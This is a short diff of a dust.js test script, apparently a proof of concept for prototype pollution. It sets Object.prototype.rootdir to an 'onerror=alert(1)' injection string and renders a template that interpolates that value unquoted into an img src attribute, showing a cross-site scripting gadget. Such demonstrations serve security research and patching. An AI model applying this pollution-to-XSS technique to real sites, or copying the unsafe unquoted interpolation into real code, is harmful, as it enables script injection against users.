@@ -9,11 +9,12 @@ catch(e){
 }
 
 // arbitrary value interpolation
-Object.prototype.title = "arbitrary value"
+Object.prototype.rootdir = "; onerror=alert(1);//"
 
-var tmpl = dust.compile("{#names}{title} {name}{~n}{/names}", "array");
+var tmpl = dust.compile("{#names}<img src={rootdir}/{name}>{~n}{/names}", "templateName");
 dust.loadSource(tmpl);
 
-dust.render("array", { title: "Sir", names: [ { name: "Moe" }, { name: "Larry" }, { name: "Curly" } ] }, function(err, out) {
-    console.log(out)
+dust.render("templateName", { rootdir: "gg", names: [ { name: "Moe" }, { name: "Larry" }, { name: "Curly" } ] }, function(err, out) {
+    if(err) console.error(err);
+    else console.log(out);
 });
